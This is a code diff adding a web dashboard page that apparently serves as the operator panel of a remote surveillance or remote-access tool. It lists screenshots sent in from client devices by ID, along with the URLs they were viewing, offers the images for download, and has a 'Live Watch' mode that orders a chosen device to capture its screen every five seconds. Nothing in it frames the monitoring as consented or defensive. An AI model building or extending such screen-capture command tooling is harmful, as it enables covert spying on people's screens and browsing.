@@ -1,0 +1,28 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><script src="https://cdn.tailwindcss.com"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script></head>
+<body class="bg-[#0b1220] text-slate-100"><div class="flex" id="lay"></div>
+<script src="common.js"></script><script>
+const SEL=new URLSearchParams(location.search).get('c')||'';
+lay.innerHTML=nav('captures.html')+`<main class="flex-1 p-4 md:p-6"><div id="topbar"></div><div class="flex flex-wrap items-center gap-2 mb-1"><button id="liveBtn" onclick="toggleLive()" class="ml-auto bg-red-500/15 border border-red-500/40 text-red-300 text-sm px-4 py-2 rounded-xl flex items-center gap-2"><i data-lucide="radio" class="w-4 h-4"></i><span>Live Watch</span></button></div><p class="text-xs opacity-50 mb-4">Click a file to view full image • Live Watch grabs a frame every 5s</p>
+<div class="bg-[#111c33] border border-white/5 rounded-2xl overflow-hidden"><div class="hidden md:grid grid-cols-12 gap-2 px-4 py-2 text-[11px] uppercase tracking-widest opacity-50 border-b border-white/5"><div class="col-span-7">File</div><div class="col-span-5">Date</div></div><div id="g"></div></div></main>
+<div id="lb" class="hidden fixed inset-0 z-50 bg-black/90 p-4 md:p-8 overflow-auto" onclick="if(event.target===this)closeLb()"><div class="max-w-5xl mx-auto bg-[#111c33] rounded-2xl overflow-hidden"><img id="lb_img" class="w-full max-h-[75vh] object-contain bg-black"><div class="flex flex-wrap items-center gap-3 p-4"><div><div id="lb_name" class="font-bold"></div><div id="lb_meta" class="text-xs opacity-60"></div></div><div class="ml-auto flex gap-2"><a id="lb_dl" download class="bg-emerald-400 text-slate-950 text-sm font-bold px-4 py-2 rounded-xl cursor-pointer">⬇ Download</a><button onclick="closeLb()" class="bg-slate-700 text-sm px-4 py-2 rounded-xl">✕ Close</button></div></div></div></div>`;
+showLoader();connErr();mountTopbar('Captures'+(SEL?' — '+SEL:''),'image');
+let SHOTS=[];
+function fsize(d){const b=(d||'').split(',')[1]||'';const kb=Math.round(b.length*3/4/1024);return kb>1024?(kb/1024).toFixed(1)+' MB':kb+' KB';}
+function fname(e){const d=new Date(e.ts);const p=n=>String(n).padStart(2,'0');return `${e.clientId}_${d.getFullYear()}-${p(d.getMonth()+1)}-${p(d.getDate())}_${p(d.getHours())}${p(d.getMinutes())}.jpg`;}
+db.ref('events').limitToLast(300).on('value',s=>{hideLoader();
+SHOTS=Object.values(s.val()||{}).sort((a,b)=>b.ts-a.ts).filter(e=>e.type==='screenshot'&&(!SEL||e.clientId===SEL)).slice(0,60);
+g.innerHTML=SHOTS.map((e,i)=>{const d=new Date(e.ts);
+return `<button onclick="openLb(${i})" class="w-full text-left grid grid-cols-12 gap-2 items-center px-4 py-3 border-b border-white/5 hover:bg-emerald-400/10">
+<span class="col-span-12 md:col-span-7 flex items-center gap-3"><span class="w-11 h-11 rounded-lg grid place-items-center shrink-0 border border-white/15 text-emerald-300" style="background:linear-gradient(135deg,#1e293b,#0f172a)"><i data-lucide="file-image" class="w-5 h-5"></i></span><span><span class="block font-bold">${e.clientId}</span><span class="block text-[11px] opacity-50">${fname(e)}</span></span></span>
+<span class="col-span-12 md:col-span-5 text-xs opacity-60 flex items-center gap-1.5"><i data-lucide="calendar" class="w-3.5 h-3.5"></i>${d.toLocaleDateString()} • ${d.toLocaleTimeString()}</span></button>`;}).join('')||'<div class="p-4 text-sm opacity-50">No captures</div>';});
+function openLb(i){const e=SHOTS[i];if(!e)return;const d=new Date(e.ts);
+lb_img.src=e.data.image;lb_name.innerText=fname(e);lb_meta.innerText=`🖥️ ${e.clientId} • 📅 ${d.toLocaleString()}${e.data.url?' • 🌐 '+e.data.url.slice(0,80):''}`;lb_dl.href=e.data.image;lb_dl.download=fname(e);lb.classList.remove('hidden');}
+function closeLb(){lb.classList.add('hidden');lb_img.src='';}
+let liveIv=null;
+function toggleLive(){if(!SEL&&!QDEV)return alert('Select a device first');const id=SEL||QDEV;
+if(liveIv){clearInterval(liveIv);liveIv=null;liveBtn.classList.remove('bg-red-500','text-slate-950');liveBtn.querySelector('span').innerText='Live Watch';return;}
+liveBtn.classList.add('bg-red-500','text-slate-950');liveBtn.querySelector('span').innerText='Stop Live';
+const grab=()=>db.ref('commands/'+id).push({cmd:'screenshot',ts:Date.now(),live:true});grab();liveIv=setInterval(grab,5000);}
+</script></body></html>
